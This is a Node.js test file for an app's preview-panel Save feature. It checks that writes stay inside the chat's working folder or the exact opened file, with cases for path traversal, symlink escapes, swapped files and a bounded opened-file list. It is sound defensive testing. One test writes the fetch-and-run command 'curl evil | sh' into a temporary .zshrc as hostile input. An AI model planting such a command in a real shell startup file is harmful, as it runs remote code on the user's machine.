// ATO-2533: Save from the preview panel writes only inside the chat's working
// folder or to the very file the panel opened (main/preview-save-scope.ts),
// and only for the main window's page (main.ts). Throwaway folders only.
import { after, test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const { filePreviewSave } = require("../out/main/file-save.js");
const { PreviewOpenedFiles, previewSaveScope, PREVIEW_OPENED_MAX } = require("../out/main/preview-save-scope.js");

const home = realpathSync(mkdtempSync(join(tmpdir(), "pss-home-")));
after(() => rmSync(home, { recursive: true, force: true }));
const P = process.platform;
const work = join(home, "project");
const other = join(home, "Documents");
for (const d of [work, other]) mkdirSync(d, { recursive: true });
const stamp = (f) => { const s = statSync(f); return { size: s.size, mtimeMs: s.mtimeMs }; };

/** Save as main.ts does it now: the scope's roots and its final say. */
async function save(file, text, workingDir, opened) {
  const scope = previewSaveScope(workingDir, opened, P);
  return filePreviewSave(file, text, stamp(file), scope.roots, home, P, { allows: scope.allows });
}

test("Save writes inside the chat's working folder", async () => {
  const f = join(work, "notes.md");
  writeFileSync(f, "old\n");
  const r = await save(f, "new\n", work, new PreviewOpenedFiles());
  assert.equal(r.ok, true);
  assert.equal(readFileSync(f, "utf8"), "new\n");
});

test("Save is refused for another file under home, even one the preview could read", async () => {
  const f = join(other, "taxes.txt");
  writeFileSync(f, "keep");
  assert.deepEqual(await save(f, "x", work, new PreviewOpenedFiles()), { ok: false, reason: "outside" });
  const rc = join(home, ".zshrc");
  writeFileSync(rc, "keep");
  assert.deepEqual(await save(rc, "curl evil | sh", work, new PreviewOpenedFiles()), { ok: false, reason: "outside" });
  assert.equal(readFileSync(rc, "utf8"), "keep");
  // `..` out of the working folder is the same file outside it.
  assert.deepEqual(await save(join(work, "..", ".zshrc"), "x", work, new PreviewOpenedFiles()), { ok: false, reason: "outside" });
  assert.equal(readFileSync(f, "utf8"), "keep");
});

test("a link in the working folder that leads out of it is outside it", async () => {
  const target = join(other, "linked.txt");
  writeFileSync(target, "keep");
  symlinkSync(target, join(work, "link.txt"));
  assert.deepEqual(await save(join(work, "link.txt"), "x", work, new PreviewOpenedFiles()), { ok: false, reason: "outside" });
  assert.equal(readFileSync(target, "utf8"), "keep");
});

test("Save writes the exact file the panel opened, outside the working folder", async () => {
  const f = join(other, "opened.txt");
  writeFileSync(f, "old");
  const opened = new PreviewOpenedFiles();
  await opened.remember(f, work);
  const r = await save(f, "new", work, opened);
  assert.equal(r.ok, true);
  assert.equal(readFileSync(f, "utf8"), "new");
  // Its neighbour was not opened.
  const n = join(other, "neighbour.txt");
  writeFileSync(n, "keep");
  assert.deepEqual(await save(n, "x", work, opened), { ok: false, reason: "outside" });
});

test("an opened file counts only under the folder it was opened in, and only while it is the same file", async () => {
  const f = join(other, "swapped.txt");
  writeFileSync(f, "old");
  const opened = new PreviewOpenedFiles();
  await opened.remember(f, work);
  // Another chat folder: not this chat's file.
  assert.deepEqual(await save(f, "x", join(home, "elsewhere"), opened), { ok: false, reason: "outside" });
  // Put another file in its place (made first, so it is surely another inode): not the file the panel opened.
  writeFileSync(f + ".tmp", "new file");
  renameSync(f + ".tmp", f);
  assert.deepEqual(await save(f, "x", work, opened), { ok: false, reason: "outside" });
  assert.equal(readFileSync(f, "utf8"), "new file");
  // A link put in its place, leading to a file that was never opened.
  const secret = join(other, "secret.txt");
  writeFileSync(secret, "keep");
  const g = join(other, "relinked.txt");
  writeFileSync(g, "old");
  await opened.remember(g, work);
  unlinkSync(g);
  symlinkSync(secret, g);
  assert.deepEqual(await save(g, "x", work, opened), { ok: false, reason: "outside" });
  assert.equal(readFileSync(secret, "utf8"), "keep");
});

test("a remote agent has no working folder here: only opened files", async () => {
  const f = join(work, "remote.txt");
  writeFileSync(f, "keep");
  assert.deepEqual(await save(f, "x", null, new PreviewOpenedFiles()), { ok: false, reason: "outside" });
});

test("the remembered list is bounded, the oldest first out", async () => {
  const opened = new PreviewOpenedFiles();
  const files = [];
  for (let i = 0; i <= PREVIEW_OPENED_MAX; i++) {
    const f = join(other, `many-${i}.txt`);
    writeFileSync(f, "x");
    files.push(f);
    await opened.remember(f, work);
  }
  const paths = opened.paths(work);
  assert.equal(paths.length, PREVIEW_OPENED_MAX);
  assert.ok(!paths.includes(files[0]));
  assert.ok(paths.includes(files[PREVIEW_OPENED_MAX]));
});

test("main.ts: Save only from the main window, with the narrowed scope; the read remembers what it served", () => {
  const main = readFileSync(new URL("../main/main.ts", import.meta.url), "utf8");
  const handler = main.slice(main.indexOf('ipcMain.handle("app:filePreviewSave"'), main.indexOf('ipcMain.handle("app:imageSaveAs"'));
  assert.match(handler, /_event\.sender !== win\.webContents\) return \{ ok: false, reason: "outside" \}/);
  assert.match(handler, /previewSaveScope\(previewWorkingDir\(\), previewOpened, process\.platform\)/);
  assert.match(handler, /scope\.roots, homedir\(\), process\.platform, \{ force: force === true, allows: scope\.allows \}/);
  assert.doesNotMatch(handler, /previewRoots\(\)/);
  const read = main.slice(main.indexOf('ipcMain.handle("app:filePreview",'), main.indexOf('ipcMain.handle("app:filePreviewSlides"'));
  assert.match(read, /previewOpened\.remember\(r\.path, previewWorkingDir\(\)\)/);
});
